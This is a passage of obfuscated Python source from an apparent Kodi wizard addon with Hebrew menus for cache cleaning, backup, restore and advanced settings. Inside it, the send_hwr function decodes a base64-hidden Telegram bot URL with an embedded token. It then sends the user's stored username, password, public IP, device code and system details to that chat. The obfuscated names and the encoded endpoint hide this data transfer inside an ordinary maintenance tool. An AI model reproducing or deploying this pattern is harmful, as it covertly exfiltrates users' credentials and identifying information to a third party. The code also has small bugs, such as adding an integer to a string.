	wiz .ebi ('UpdateAddonRepos()')#line:1876
	wiz .ebi ('UpdateLocalAddons()')#line:1877
	wiz .refresh ()#line:1878
def installDep (O0O00O00OO0OOO0OO ,DP =None ):#line:1880
	OOO00OOO0OO0O0OOO =os .path .join (ADDONS ,O0O00O00OO0OOO0OO ,'addon.xml')#line:1881
	if os .path .exists (OOO00OOO0OO0O0OOO ):#line:1882
		O00OOO0OO0O0OO0O0 =open (OOO00OOO0OO0O0OOO ,mode ='r');O0OOO00O0O0O00O0O =O00OOO0OO0O0OO0O0 .read ();O00OOO0OO0O0OO0O0 .close ();#line:1883
		O000OO0O000000O0O =wiz .parseDOM (O0OOO00O0O0O00O0O ,'import',ret ='addon')#line:1884
		for O00O0O0O0OO00O0O0 in O000OO0O000000O0O :#line:1885
			if not 'xbmc.python'in O00O0O0O0OO00O0O0 :#line:1886
				if not DP ==None :#line:1887
					DP .update (0 +'\n'+''+'\n'+'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0O0OO00O0O0 ))#line:1888
def installed (OOOOOOOO00O0OOO00 ):#line:1916
	O0O000OO0O0O0OO00 =os .path .join (ADDONS ,OOOOOOOO00O0OOO00 ,'addon.xml')#line:1917
	if os .path .exists (O0O000OO0O0O0OO00 ):#line:1918
		try :#line:1919
			OOOO0000OOOOO0OOO =open (O0O000OO0O0O0OO00 ,mode ='r');OOO0O00O0O0OOO0O0 =OOOO0000OOOOO0OOO .read ();OOOO0000OOOOO0OOO .close ()#line:1920
			OO00000OO0OOO000O =wiz .parseDOM (OOO0O00O0O0OOO0O0 ,'addon',ret ='name',attrs ={'id':OOOOOOOO00O0OOO00 })#line:1921
			OO0000OOOOO0O0O00 =os .path .join (ADDONS ,OOOOOOOO00O0OOO00 ,'icon.png')#line:1922
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00000OO0OOO000O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0000OOOOO0O0O00 )#line:1923
		except :pass #line:1924
def passandpin ():#line:1927
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:1928
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:1929
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:1930
def passandUsername ():#line:1931
	ADDON .openSettings ()#line:1933
def folderback ():#line:1935
    OO0OOOO0OOOOO0000 =wiz .getS ("path")#line:1936
    if OO0OOOO0OOOOO0000 :#line:1937
      OO0OOOO0OOOOO0000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:1938
      ADDON .setSetting ("path",OO0OOOO0OOOOO0000 )#line:1939
def send_hwr ():#line:1944
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:1945
       try :#line:1946
          import json ,requests #line:1948
          wiz .log ('FRESH MESSAGE')#line:1949
          O0000O00O0OO0O00O =(wiz .getS ("user"))#line:1950
          O00000000OO0OOOO0 =(wiz .getS ("pass"))#line:1951
          O0OO0OOOO00OOO000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1952
          OOO00O0O00OOOOOOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:1953
          OO0O00O00OO00O0O0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:1954
          OOOOO0O0OO0O0OOO0 =O0000O00O0OO0O00O #line:1956
          OO0O00OO0OO0000OO =O00000000OO0OOOO0 #line:1957
          O0O000OOOOO0000O0 =platform .uname ()#line:1959
          O0OOOO00OOO00O00O =O0O000OOOOO0000O0 [1 ]#line:1960
          OO00O00O000O0O0O0 =requests .get (OOO00O0O00OOOOOOO +que ('שלח קוד: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOOO0O0OO0O0OOO0 +que (' סיסמה: ')+OO0O00OO0OO0000OO +que (' קודי: ')+O0OO0OOOO00OOO000 +que (' כתובת: ')+OO0O00O00OO00O0O0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0OOOO00OOO00O00O ).json ()#line:1961
          OO00O00O000O0O0O0 =requests .get (OOO00O0O00OOOOOOO +HARDWAER ).json ()#line:1962
          xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1964
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]נשלח[/COLOR]'%COLOR2 )#line:1965
       except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין קוד פנה למנהל[/COLOR]'%COLOR2 )#line:1966
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1967
def backmyupbuild ():#line:1968
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:1970
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:1971
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:1972
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:1974
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:1975
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:1977
def maintMenu (view =None ):#line:1979
	O0O0O000OO0000O0O ='[B][COLOR green]ON[/COLOR][/B]';OO0O00OO000O00O00 ='[B][COLOR red]OFF[/COLOR][/B]'#line:1981
	O0OO00O0OOOOO0O00 ='true'if AUTOCLEANUP =='true'else 'false'#line:1982
	O00OO0O0OOO00OO00 ='true'if AUTOCACHE =='true'else 'false'#line:1983
	OOO0OO00O0OO000O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:1984
	O0OOOO0O0OOO0O0OO ='true'if AUTOTHUMBS =='true'else 'false'#line:1985
	OOOO000OOO0OOO0OO ='true'if SHOWMAINT =='true'else 'false'#line:1986
	OO0O0O00OO00000OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:1987
	OO000O0O0O0O000OO ='true'if INCLUDEALL =='true'else 'false'#line:1988
	O00OO0OOO000OOOOO ='true'if THIRDPARTY =='true'else 'false'#line:1989
	if wiz .Grab_Log (True )==False :OO000O0000OOO0OO0 =0 #line:1990
	else :OO000O0000OOO0OO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:1991
	if wiz .Grab_Log (True ,True )==False :O0O0O000000OOOOO0 =0 #line:1992
	else :O0O0O000000OOOOO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:1993
	O0OO0OOOO000OOO0O =int (OO000O0000OOO0OO0 )+int (O0O0O000000OOOOO0 )#line:1994
	O0O0000OOOO0000O0 =str (O0OO0OOOO000OOO0O )+' Error(s) Found'if O0OO0OOOO000OOO0O >0 else 'None Found'#line:1995
	O0O000O000O00O000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:1996
	if OO000O0O0O0O000OO =='true':#line:1997
		O0OO000OO00OOOOO0 ='true'#line:1998
		O00O0OO000OO000O0 ='true'#line:1999
		OO0O0OO0OO0O000O0 ='true'#line:2000
		OOOO0OO00O0O00000 ='true'#line:2001
		OO0O000O00OO0OO0O ='true'#line:2002
		OO0O0O0OO0OO0OO0O ='true'#line:2003
		O0OOOO00OOO000OO0 ='true'#line:2004
		OO00OOO0OO00O00O0 ='true'#line:2005
	else :#line:2006
		O0OO000OO00OOOOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2007
		O00O0OO000OO000O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2008
		OO0O0OO0OO0O000O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2009
		OOOO0OO00O0O00000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2010
		OO0O000O00OO0OO0O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2011
		OO0O0O0OO0OO0OO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2012
		O0OOOO00OOO000OO0 ='true'if INCLUDESALTS =='true'else 'false'#line:2013
		OO00OOO0OO00O00O0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2014
	O000O00OO0000O0OO =wiz .getSize (PACKAGES )#line:2015
	O0OO0O0OO0O0O0O0O =wiz .getSize (THUMBS )#line:2016
	OO0O0O000OOOOO0O0 =wiz .getCacheSize ()#line:2017
	OO00O00O0O0O0O0O0 =O000O00OO0000O0OO +O0OO0O0OO0O0O0O0O +OO0O0O000OOOOO0O0 #line:2018
	OOO0OO0O0O000OO0O =['Daily','Always','3 Days','Weekly']#line:2019
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2020
	if view =="clean"or SHOWMAINT =='true':#line:2021
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O00O0O0O0O0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2022
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0O000OOOOO0O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2023
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O00OO0000O0OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2024
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0O0OO0O0O0O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2025
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2026
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2027
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2028
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2029
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2030
	if view =="addon"or SHOWMAINT =='false':#line:2031
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2032
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2033
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2034
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2035
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2036
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2037
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2038
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2039
	if view =="misc"or SHOWMAINT =='true':#line:2040
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2041
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2042
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2043
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2044
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2045
		addFile ('View Errors in Log: %s'%(O0O0000OOOO0000O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2046
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2047
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2048
		addFile ('Clear Wizard Log File%s'%O0O000O000O00O000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2049
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	if view =="backup"or SHOWMAINT =='true':#line:2051
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2052
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2053
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2054
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2055
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2056
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2057
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2058
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2059
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2060
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2061
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2062
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2063
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2064
	if view =="tweaks"or SHOWMAINT =='true':#line:2065
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2066
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2067
		else :#line:2068
			if os .path .exists (ADVANCED ):#line:2069
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2070
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2071
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2072
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2073
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2074
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2075
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2076
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2077
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2078
	addFile ('Show All Maintenance: %s'%OOOO000OOO0OOO0OO .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2079
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2080
	addFile ('Third Party Wizards: %s'%O00OO0OOO000OOOOO .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2081
	if O00OO0OOO000OOOOO =='true':#line:2082
		OOO0OO000O0OOO00O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2083
		O0000O00O000O0OO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2084
		OO00OOO0O000OO0OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2085
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OO000O0OOO00O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2086
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0000O00O000O0OO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2087
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00OOO0O000OO0OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2088
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2089
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO00O0OOOOO0O00 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2090
	if O0OO00O0OOOOO0O00 =='true':#line:2091
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOO0OO0O0O000OO0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2092
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00OO0O0OOO00OO00 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2093
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOO0OO00O0OO000O0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2094
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OOOO0O0OOO0O0OO .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2095
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2096
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O0O00OO00000OO .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2097
	if OO0O0O00OO00000OO =='true':#line:2098
		addFile ('--- Include All Video Addons: %s'%OO000O0O0O0O000OO .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2099
		addFile ('--- Include Bob: %s'%O0OO000OO00OOOOO0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2100
		addFile ('--- Include Phoenix: %s'%O00O0OO000OO000O0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2101
		addFile ('--- Include Specto: %s'%OO0O0OO0OO0O000O0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2102
		addFile ('--- Include Exodus: %s'%OO0O000O00OO0OO0O .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2103
		addFile ('--- Include Salts: %s'%O0OOOO00OOO000OO0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2104
		addFile ('--- Include Salts HD Lite: %s'%OO00OOO0OO00O00O0 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2105
		addFile ('--- Include One Channel: %s'%OO0O0O0OO0OO0OO0O .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2106
		addFile ('--- Include Genesis: %s'%OOOO0OO00O0O00000 .replace ('true',O0O0O000OO0000O0O ).replace ('false',OO0O00OO000O00O00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2107
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2108
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2109
	setView ('files','viewType')#line:2110
def advancedWindow (url =None ):#line:2112
	if not ADVANCEDFILE =='http://':#line:2113
		if url ==None :#line:2114
			OO0OOOOO0000OOOOO =wiz .workingURL (ADVANCEDFILE )#line:2115
			O000OO000O0OO00OO =uservar .ADVANCEDFILE #line:2116
		else :#line:2117
			OO0OOOOO0000OOOOO =wiz .workingURL (url )#line:2118
			O000OO000O0OO00OO =url #line:2119
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2120
		if os .path .exists (ADVANCED ):#line:2121
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2122
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2123
		if OO0OOOOO0000OOOOO ==True :#line:2124
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2125
			OO000OOOOOO0OO0OO =wiz .openURL (O000OO000O0OO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2126
			O00O0OO00OOOOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000OOOOOO0OO0OO )#line:2127
			if len (O00O0OO00OOOOOOOO )>0 :#line:2128
				for OO0O00O0O000OO00O ,OOOO000OOO0OOO00O ,url ,OOO0OO0000OO000OO ,O0O00O00OOO0000O0 ,OOOOOO0000O00O0OO in O00O0OO00OOOOOOOO :#line:2129
					if OOOO000OOO0OOO00O .lower ()=="yes":#line:2130
						addDir ("[B]%s[/B]"%OO0O00O0O000OO00O ,'advancedsetting',url ,description =OOOOOO0000O00O0OO ,icon =OOO0OO0000OO000OO ,fanart =O0O00O00OOO0000O0 ,themeit =THEME3 )#line:2131
					else :#line:2132
						addFile (OO0O00O0O000OO00O ,'writeadvanced',OO0O00O0O000OO00O ,url ,description =OOOOOO0000O00O0OO ,icon =OOO0OO0000OO000OO ,fanart =O0O00O00OOO0000O0 ,themeit =THEME2 )#line:2133
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2134
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOOOO0000OOOOO )#line:2135
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2136
def writeAdvanced (OO00O0O000OOOO0OO ,O00O0O000OO00000O ):#line:2138
	OOO00O0OOO0OOO000 =wiz .workingURL (O00O0O000OO00000O )#line:2139
	if OOO00O0OOO0OOO000 ==True :#line:2140
		if os .path .exists (ADVANCED ):OOO00000000OOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00O0O000OOOO0OO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2141
		else :OOO00000000OOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00O0O000OOOO0OO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2142
		if OOO00000000OOOOO0 ==1 :#line:2144
			O000OOO0O0OO0OOO0 =wiz .openURL (O00O0O000OO00000O )#line:2145
			OO00OO00OOOO0OOOO =open (ADVANCED ,'w');#line:2146
			OO00OO00OOOO0OOOO .write (O000OOO0O0OO0OOO0 )#line:2147
			OO00OO00OOOO0OOOO .close ()#line:2148
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2149
			wiz .killxbmc (True )#line:2150
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2151
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO00O0OOO0OOO000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2152
def viewAdvanced ():#line:2154
	OOO0OO00O0O000O0O =open (ADVANCED )#line:2155
	OOO0OO0OOOO0OO0OO =OOO0OO00O0O000O0O .read ().replace ('\t','    ')#line:2156
	wiz .TextBox (ADDONTITLE ,OOO0OO0OOOO0OO0OO )#line:2157
	OOO0OO00O0O000O0O .close ()#line:2158
def removeAdvanced ():#line:2160
	if os .path .exists (ADVANCED ):#line:2161
		wiz .removeFile (ADVANCED )#line:2162
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2163
def showAutoAdvanced ():#line:2165
	notify .autoConfig ()#line:2166
def getIP ():#line:2168
	O0O0OO0O000OO000O ='http://whatismyipaddress.com/'#line:2169
	if not wiz .workingURL (O0O0OO0O000OO000O ):return 'Unknown','Unknown','Unknown'#line:2170
	O00O0O0OO0O0000OO =wiz .openURL (O0O0OO0O000OO000O ).replace ('\n','').replace ('\r','')#line:2171
	if not 'Access Denied'in O00O0O0OO0O0000OO :#line:2172
		OOOO000O00000O0O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00O0O0OO0O0000OO )#line:2173
		OOO0O0OO000O0O0OO =OOOO000O00000O0O0 [0 ]if (len (OOOO000O00000O0O0 )>0 )else 'Unknown'#line:2174
		O0OO00OOOOO00OO00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O00O0O0OO0O0000OO )#line:2175
		OOO0O0OOOO0O00OO0 =O0OO00OOOOO00OO00 [0 ]if (len (O0OO00OOOOO00OO00 )>0 )else 'Unknown'#line:2176
		O00OO000OOOOOOO0O =O0OO00OOOOO00OO00 [1 ]+', '+O0OO00OOOOO00OO00 [2 ]+', '+O0OO00OOOOO00OO00 [3 ]if (len (O0OO00OOOOO00OO00 )>2 )else 'Unknown'#line:2177
		return OOO0O0OO000O0O0OO ,OOO0O0OOOO0O00OO0 ,O00OO000OOOOOOO0O #line:2178
	else :return 'Unknown','Unknown','Unknown'#line:2179
def systemInfo ():#line:2181
	OOOO0OO0000O00000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2195
	OOO0OO0O0OO0000O0 =[];OO0000O00O00OOO00 =0 #line:2196
	for OOO0000OO00O00000 in OOOO0OO0000O00000 :#line:2197
		OOOO00OO0O00O0OO0 =wiz .getInfo (OOO0000OO00O00000 )#line:2198
		O0000000O0O00OOOO =0 #line:2199
		while OOOO00OO0O00O0OO0 =="Busy"and O0000000O0O00OOOO <10 :#line:2200
			OOOO00OO0O00O0OO0 =wiz .getInfo (OOO0000OO00O00000 );O0000000O0O00OOOO +=1 ;wiz .log ("%s sleep %s"%(OOO0000OO00O00000 ,str (O0000000O0O00OOOO )));xbmc .sleep (1000 )#line:2201
		OOO0OO0O0OO0000O0 .append (OOOO00OO0O00O0OO0 )#line:2202
		OO0000O00O00OOO00 +=1 #line:2203
	O0O0000OOO0O00OO0 =OOO0OO0O0OO0000O0 [8 ]if 'Una'in OOO0OO0O0OO0000O0 [8 ]else wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [8 ][:-8 ]))*1024 *1024 )#line:2204
	O000OOOO00OOO00O0 =OOO0OO0O0OO0000O0 [9 ]if 'Una'in OOO0OO0O0OO0000O0 [9 ]else wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [9 ][:-8 ]))*1024 *1024 )#line:2205
	O00000OOOO0OO0O00 =OOO0OO0O0OO0000O0 [10 ]if 'Una'in OOO0OO0O0OO0000O0 [10 ]else wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [10 ][:-8 ]))*1024 *1024 )#line:2206
	OO00OOO0O00000OOO =wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [11 ][:-2 ]))*1024 *1024 )#line:2207
	O000OOO000O00O000 =wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [12 ][:-2 ]))*1024 *1024 )#line:2208
